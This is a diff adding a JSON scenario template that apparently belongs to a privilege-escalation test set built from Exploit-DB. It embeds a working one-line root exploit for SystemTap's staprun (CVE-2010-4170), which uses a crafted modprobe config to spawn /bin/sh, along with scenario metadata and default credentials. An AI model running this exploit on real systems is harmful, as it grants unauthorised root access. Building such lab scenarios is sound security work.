@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_15620",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: SystemTap - Local Privilege Escalation (CVE-2010-4170;OSVDB-69489)\n\nExploit source code (15620.sh):\n```\nCVE-2010-4170\n\nprintf \"install uprobes /bin/sh\" > exploit.conf; MODPROBE_OPTIONS=\"-C exploit.conf\" staprun -u whatever\n\n\nRHEL Advisory:\nhttps://rhn.redhat.com/errata/RHSA-2010-0894.html\n```",
+  "cve": "CVE-2010-4170;OSVDB-69489",
+  "exploitdb_id": "15620",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_15620",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
